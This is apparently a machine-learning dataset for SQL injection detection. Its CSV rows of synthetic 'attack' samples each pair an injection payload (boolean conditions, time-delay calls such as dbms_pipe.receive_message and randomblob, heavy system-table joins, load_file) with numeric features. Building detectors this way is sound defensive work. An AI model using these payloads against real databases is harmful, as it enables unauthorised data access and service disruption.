id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000112,attack,boolean,"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",nearest_attack_euclidean,R000168,0.21721363131220137,78.74388739562801,27.82645287658677,3.9311602947609083,18.95871725952062,24.0,24.95871725952062,10.826452876586771,0.2397927287778885,0.3061268523066318,0.31632444185454645,0.13775597706093323,0.0,1.0,3.0,0.0,0.0,2.0,0.0,2.8264528765867696,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000113,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000240,1.7509547875278562,125.16202493567661,30.10801662378441,4.165869738161089,76.21603324756882,5.891983376215592,29.945991688107796,13.108016623784408,0.6085226857604175,0.047485000794882756,0.23958684765261118,0.10440546579208856,0.0,1.5810124678383066,0.0,0.0,1.0,1.0,0.0,3.472995844053898,0.0,0.0,2.527004155946102,2.0,0.0,0.5270041559461022,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000114,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000214,0.31381683326662974,69.17916333375925,25.36416733324815,3.655792977897694,12.0,16.0,26.543330667007403,14.63583266675185,0.17405911798542806,0.23207882398057078,0.3822581168349726,0.21160394119902853,0.0,4.0,1.0,0.0,0.0,2.0,0.0,3.635832666751851,1.9999999999999998,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000115,attack,boolean,"1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000256,0.7495071082248619,133.50570320044505,31.539338953914623,4.047545138710882,66.15735581565849,8.269669476957311,41.53933895391462,17.539338953914623,0.4953249731687531,0.06191562164609414,0.311424434254473,0.13133497093067967,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.0,1.0,0.0,2.2696694769573114,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.26966947695731125,0.7303305230426886,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000116,attack,boolean,"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000210,1.5353144850157234,105.0,33.41268972193899,3.797786954497709,31.58731027806101,15.0,42.0,16.41268972193899,0.30083152645772393,0.14285714285714285,0.4,0.15631133068513325,2.4126897219389902,0.5873102780610098,2.0,1.0,0.0,1.0,0.0,8.0,0.4126897219389904,0.0,1.0,4.0,1.0,0.5873102780610097,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5873102780610095,0.4126897219389904,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000117,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",nearest_attack_euclidean,R000064,0.072024955297154,133.3168244506667,29.070405433481486,3.5888661367204735,50.152545105876555,10.0,55.07040543348149,18.09387391130865,0.37614883818365824,0.07503908625438595,0.41315500835838204,0.13565706720357376,4.976531522172838,1.1102230246251565e-16,0.0,0.9882657610864188,0.0,0.0,0.0,11.023468477827162,0.0,0.023468477827162437,1.0,1.0586711945679057,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.011734238913581108,1.0,0.0,0.0,0.011734238913581219,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.011734238913581
SMOTE_000118,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'ojkd'  =  'ojkd",nearest_attack_euclidean,R000165,1.7675361123545745,136.77765046899066,28.38517669793271,3.9664344240211813,69.07411651033645,10.00729707312523,39.08141358346168,18.61482330206729,0.5073458161432468,0.07095407634813615,0.2850397240693201,0.1366603834392969,1.8444699062018703,1.1102230246251565e-16,0.0,0.0,1.0,1.38517669793271,0.0,5.38517669793271,0.0,5.0,4.0,2.3851766979327103,0.6148233020672902,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.38517669793271,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.38517669793271
SMOTE_000119,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""unju""  =  ""unju",nearest_attack_euclidean,R000219,1.4243445947613125,125.74203995339164,32.41014571095655,3.744177854662899,44.76956286713036,12.05072855478273,50.69131139860892,18.23043713286964,0.35772473297261365,0.09506635740298577,0.4024304409218695,0.144778468702531,2.0,3.410145710956546,0.0,1.0,0.0,1.410145710956546,0.0,9.410145710956545,0.0,0.0,1.0,2.410145710956546,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5898542890434539,0.0,0.0,0.0,1.410145710956546,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000120,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R000262,0.2904344170121293,131.53267064171277,28.73366467914361,3.234702569180377,34.7102275222837,13.0,66.0,17.822443119429074,0.2637170002563621,0.09885079855450682,0.50185790035365,0.13557430083548108,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.0,1.8224431194290744,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000121,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",nearest_attack_euclidean,R000012,1.362118198744363,104.00894483815942,28.0,3.809989947401355,45.455377024417075,12.738090418323134,35.0,10.815477395419217,0.4246472964560651,0.12907699744565418,0.3418178253283531,0.10445788076992768,0.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,5.5922613022903915,0.0,0.5922613022903916,1.4077386977096085,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000122,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'cysu' like 'cysu",nearest_attack_euclidean,R000141,0.024582527800611265,151.944965632237,34.00611492975145,3.881774110266214,50.99388507024855,15.993885070248556,57.969425351242776,26.987770140497112,0.33561268326433996,0.10526090727649928,0.38151199147585374,0.17761441798330704,3.981655210745668,1.1102230246251565e-16,0.012229859502888463,0.0,0.0,1.0,0.0,11.993885070248556,0.0,2.0,1.0,7.012229859502888,1.0,0.0,0.006114929751444231,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.9938850702485558,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9938850702485558
SMOTE_000123,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000104,0.6821099684552184,79.29915185790937,24.0,3.561309874365308,21.0,13.0,32.542130163922316,12.757021693987053,0.26669499554421117,0.1650969020035593,0.4072084428913988,0.1609996595608307,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,4.757021693987053,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000124,attack,boolean,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000276,0.7915974359576728,125.20337653430946,28.236517115195884,3.9760576816397024,65.47303423039176,9.892136921567072,37.36517115195884,12.473034230391768,0.5251493329176583,0.0775486747836604,0.29763511499614026,0.09966687730254101,0.0,1.1102230246251565e-16,0.0,0.0,1.0,1.236517115195884,0.0,5.236517115195884,0.0,0.0,2.0,2.236517115195884,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.23651711519588423,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.236517115195884
SMOTE_000125,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""ekbq""  =  ""ekbq",nearest_attack_euclidean,R000192,0.04826230534724122,128.03548756885544,27.98817081038152,4.012058503263247,72.97634162076304,3.023658379236963,36.98817081038152,15.047316758473926,0.5699774054706119,0.02361174915528179,0.2888938945420553,0.11751695083205096,0.0,3.0,0.0,0.0,1.0,1.0,0.0,5.0,0.0,0.05914594809240559,2.0236583792369625,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000126,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000028,0.8578328649118424,158.65121618762228,37.10699098336595,3.994869241583412,49.54422520425635,23.223252254158517,56.77674774584149,29.106990983365947,0.3115940724503724,0.14672834857052014,0.3583486105707504,0.18332896840835702,2.5534954916829724,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,11.0,0.0,2.0,1.0,11.553495491682973,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.7767477458414861,0.0,1.0,0.0,0.7767477458414861,0.22325225415851388,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.776747745841486
SMOTE_000127,attack,boolean,"1'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000034,0.33021917072887347,122.0,32.14519649981554,3.4923528287466303,32.0,15.0,56.0,19.0,0.26229508196721313,0.12295081967213115,0.45901639344262296,0.1557377049180328,2.854803500184462,0.14519649981553828,2.0,1.0,0.0,1.0,0.0,11.0,0.0,0.0,1.0,4.0,1.0,0.14519649981553825,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000128,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000006,0.3278728328774586,75.8569391863127,22.124970298003937,3.3964595445950976,17.571292790875138,14.0,30.23208769629302,14.053558699144544,0.22973214017867957,0.18536616275247939,0.3991000977379508,0.1858015993308903,0.05355869914454381,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,5.071411598859392,0.0,1.0,3.9821471002851516,1.0,0.017852899714847936,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.9821471002851521,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.982147100285152
SMOTE_000129,attack,boolean,"1'  )   where 7646  =  7646 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000073,0.5517131986358407,146.78594388038707,32.976215986709676,4.19057242130677,74.23026927574192,16.0,40.904863946838695,15.65081065780645,0.5058744439361129,0.10976833104584133,0.2775051076455608,0.10685211737248501,1.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.650810657806449,0.0,0.0,2.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000130,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000134,1.5032891785770932,88.85968328331747,23.92466862156676,3.262055444539662,19.38700293235014,13.0,42.623343107833804,13.84933724313352,0.21855290229536997,0.14762208582979,0.47868768291364,0.1551373289612,0.0,4.0,0.0,0.0,0.5376656892166197,1.4623343107833804,0.0,6.92466862156676,0.0,0.4623343107833803,0.4623343107833803,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000131,attack,boolean,"-8025""  )   or   (  1436  =  4186  )  *4186 and   (  ""sqwv"" like ""sqwv",nearest_attack_euclidean,R000040,0.9327866195947794,69.61781058794472,25.706863527668293,3.687592486448646,15.471242351778866,16.0,26.76437882411057,11.382189412055284,0.22204641503715533,0.22983748045401337,0.38456385971038864,0.16355224479844266,0.0,4.0,1.0,0.0,1.0,1.3821894120552844,0.0,4.0,0.0,0.0,0.0,3.3821894120552844,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000132,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",nearest_attack_euclidean,R000072,0.0811784800141864,114.0,28.59855308107277,4.150958951644475,71.0,5.0,22.0,16.0,0.6228070175438597,0.043859649122807015,0.19298245614035087,0.14035087719298245,3.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,2.0,0.0,5.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000133,attack,boolean,1'   )    )     )   and   (  8982  =  8027  )  *8027 and    (    (     (  'qkrv'  =  'qkrv,nearest_attack_euclidean,R000126,0.38240192231773523,88.2904695932213,18.786308699152663,2.8707576430028587,13.145234796610648,13.0,47.14523479661065,15.0,0.14759828189036941,0.14778136565887734,0.5341033920751255,0.1705169603756277,4.0,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,7.786308699152662,0.21369130084733756,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000134,attack,boolean,"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""jtgs"" like ""jtgs",nearest_attack_euclidean,R000133,2.1193687162579558,137.22642703035245,30.15095135356831,4.0864022381585645,71.91511622231286,10.0,34.92452432321584,20.386786484823766,0.5234371742956642,0.0729070218388313,0.2547833094999059,0.14887249436559863,0.0,4.0,0.0,0.0,1.0,1.4622621616079223,0.0,4.0,0.9245243232158442,5.0,4.0,2.462262161607922,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.462262161607922,0.5377378383920778,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000135,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000065,0.04469926449567288,122.41464853081438,29.0,3.9897770804190076,71.41464853081439,8.0,31.0,12.0,0.5832735544625408,0.06536885420195439,0.25330431003257314,0.09805328130293156,1.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000136,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000060,0.23029423614544425,148.12588080738735,31.251761614774708,4.25502442179124,82.50352322954942,9.0,38.74823838522529,17.874119192612646,0.5569653188721,0.060759435549315885,0.26160121211342446,0.12067403346515959,4.0,1.1102230246251565e-16,0.0,0.0,1.0,1.8741191926126466,0.0,4.0,0.0,0.0,3.0,2.8741191926126466,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000137,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,1.1442488632619758,137.48491048539827,36.93964194159307,3.9008457995548245,43.0,23.0,54.0,17.484910485398267,0.3127657277651473,0.16729329624647413,0.39277556510041756,0.12716541088796107,2.0,0.4849104853982663,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.4849104853982662,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000138,attack,boolean,"1'+  (  select kqac where 4362  =  4362 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000036,0.556488337518103,158.36167358595924,38.72334717191846,4.045150506877877,51.36167358595923,23.15958160351019,57.15958160351019,26.68083679297962,0.32427263435575726,0.14627936630071245,0.3609964731409391,0.16845152620259118,0.8404183964898083,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,11.0,0.0,2.0,1.0,10.84041839648981,0.8404183964898083,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.8404183964898082,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.840418396489808
SMOTE_000139,attack,boolean,"1""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000054,0.20190986946140738,134.46001661514765,32.942497923106544,3.6888446187574413,36.28751038446729,16.460016615147666,55.76999169242617,25.942497923106544,0.2698111095949811,0.12225572632895862,0.41493682764015327,0.19299633643590694,0.0,1.0,2.0,0.0,0.0,1.0575020768934582,0.0,11.884995846213084,0.0,2.0,1.0,9.057502076893458,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.057502076893458265,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0575020768934584
SMOTE_000140,attack,boolean,"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",nearest_attack_euclidean,R000212,0.26176839867314244,151.13588728273814,35.0,4.218484152789548,62.54564508690475,18.45435491309525,48.13588728273813,22.0,0.4145210142832631,0.12187087317156868,0.31792142706360893,0.14568668548155927,4.0,3.7728225434523734,1.0,0.0,0.0,2.0,0.0,6.227177456547626,0.0,0.0,0.0,7.0,1.0,0.9432056358630936,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000141,attack,boolean,"1%'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000230,0.9521003129033758,125.2617099072447,32.5033456877842,3.5704703820705737,34.9933086244316,13.758364219460498,55.2550185316763,21.2550185316763,0.27987218231341826,0.10947418682826855,0.44112412065073403,0.16952951020757917,5.751672843892099,1.1102230246251565e-16,0.0,1.0,0.0,1.7516728438920997,0.0,10.0,1.7516728438920997,0.0,1.0,2.7516728438920994,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.24832715610790035,0.0,0.0,0.0,1.0,0.7516728438920997,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
